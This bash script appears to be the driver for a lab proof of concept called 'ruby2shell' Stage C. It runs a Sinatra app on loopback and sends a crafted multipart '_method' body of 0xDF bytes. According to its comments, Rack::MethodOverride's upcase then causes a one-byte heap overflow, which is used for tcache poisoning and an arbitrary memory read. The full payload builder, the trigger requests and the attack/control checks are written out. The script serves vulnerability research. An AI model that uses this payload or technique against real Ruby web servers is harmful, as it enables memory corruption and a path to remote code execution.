#!/bin/bash
# Stage C over HTTP — driver. Loopback only, port 4548.
#
# 1. Starts the lab Sinatra app (lab/repro/ruby2shell-stageC-http.ru) on
#    127.0.0.1:4548 under the mtrace preload, plain 3.4.12 build; its
#    stdout+stderr (mtrace lines + the app's === markers) go to the
#    per-run trace file.
# 2. POST /trigger with a multipart `_method` part, ISO-8859-1, N=828.
#    GroomMiddleware builds [S][V][T tcache][A tcache][dummy][f_host] and
#    computes the forged PROTECT_PTR in-request; Rack::MethodOverride's
#    default upcase supplies the one 0x53 overflow byte; MarkerMiddleware
#    splices T's tcache next, repairs both headers and pops tcache[0x3f0]
#    twice, reading the nominated address back through live f_host.
#    CONTROL mode sends pure 0xDF*828 (no parity flip -> no overflow).
# 3. GET /mark returns the verdict, then a second GET checks the server
#    is alive. Evidence: lab/build/evidence/stageC-http-{tag}.{trace,out}.
set -u
cd "$(dirname "$0")/../.." || exit 1
RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
RU=lab/repro/ruby2shell-stageC-http.ru
EV=lab/build/evidence
PORT=4548
ATTACKS="${1:-3}"
CONTROLS="${2:-2}"
mkdir -p "$EV"

build_body() {  # $1 = attack|control (python emits the bytes)
  python3 - "$1" <<'PY'
import sys
mode = sys.argv[1]
data = (b'\xdf' * 828) if mode == 'control' else (b'a' + b'\xdf' * 827)
out = []
out.append(b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
           b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n')
out.append(data)
out.append(b'\r\n--XB\r\nContent-Disposition: form-data; name="f"\r\n'
           b'Content-Type: text/plain\r\n\r\nfiller\r\n--XB--\r\n')
sys.stdout.buffer.write(b''.join(out))
PY
}

run_one() {  # $1 = tag, $2 = attack|control
  local TAG="$1" MODE="$2"
  local TRACE="$EV/stageC-http-$TAG.trace" OUT="$EV/stageC-http-$TAG.out"
  if [ "$MODE" = control ]; then
    STAGEC_HTTP_CONTROL=1 STAGEC_HTTP_TRACE="$PWD/$TRACE" MTRACE_FD=2 \
      LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
      $RB $RU > "$TRACE" 2>&1 &
  else
    STAGEC_HTTP_TRACE="$PWD/$TRACE" MTRACE_FD=2 \
      LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
      $RB $RU > "$TRACE" 2>&1 &
  fi
  local SRVPID=$!
  for t in $(seq 1 50); do
    curl -s -m 1 "http://127.0.0.1:$PORT/mark" >/dev/null 2>&1 && break
    sleep 0.2
  done
  build_body "$MODE" > /tmp/stagec-http-body.bin
  {
    echo "== run $TAG $(date -u +%H:%M:%SZ)"
    echo "-- trigger:"; curl -s -m 20 -X POST "http://127.0.0.1:$PORT/trigger" \
      -H 'Content-Type: multipart/form-data; boundary=XB' \
      --data-binary @/tmp/stagec-http-body.bin -w 'HTTP %{http_code}\n'
    echo "-- mark:"; curl -s -m 10 "http://127.0.0.1:$PORT/mark"
    echo "-- alive after:"; curl -s -m 5 "http://127.0.0.1:$PORT/mark" || echo "SERVER DEAD"
  } > "$OUT" 2>&1
  kill $SRVPID 2>/dev/null; wait $SRVPID 2>/dev/null

  local TARGET POPLINE VERDICT
  TARGET=$(sed -n 's/^target=0x//p' "$TRACE" | head -1)
  POPLINE=0
  [ -n "$TARGET" ] && \
    POPLINE=$(grep -c "^M [0-9]* 3e9 $TARGET " "$TRACE" || true)
  VERDICT=$(sed -n 's/.*verdict=\([a-zA-Z]*\).*/\1/p' "$TRACE" | head -1)
  local ALIVE=YES READBACK=NO
  grep -q 'SERVER DEAD' "$OUT" && ALIVE=NO
  grep -q 'F-readback-hex=7a7a7a7a7a7a7a7a7a7a' "$OUT" && READBACK=YES
  echo "== $TAG verdict=$VERDICT target=0x$TARGET pop-at-target=$POPLINE readback=$READBACK alive=$ALIVE"
  if [ "$MODE" = attack ]; then
    if grep -q 'verdict=poisoned' "$OUT" && [ "$POPLINE" -ge 1 ] &&
       [ "$READBACK" = YES ]; then
      echo "   PASS (request-thread poisoned readback + pop at target; alive=$ALIVE)"
    else
      echo "   FAIL"
    fi
  else
    grep -q 'verdict=clean' "$OUT" && grep -q 'NO-ABORT' "$OUT" && \
      [ "$POPLINE" -eq 0 ] && \
      echo "   PASS (control clean, no pop at target)" || echo "   FAIL"
  fi
  head -6 "$OUT"
}

echo "== attack runs"
for i in $(seq 1 "$ATTACKS"); do run_one "$i" attack; done
echo "== control runs"
for i in $(seq 1 "$CONTROLS"); do run_one "control-$i" control; done
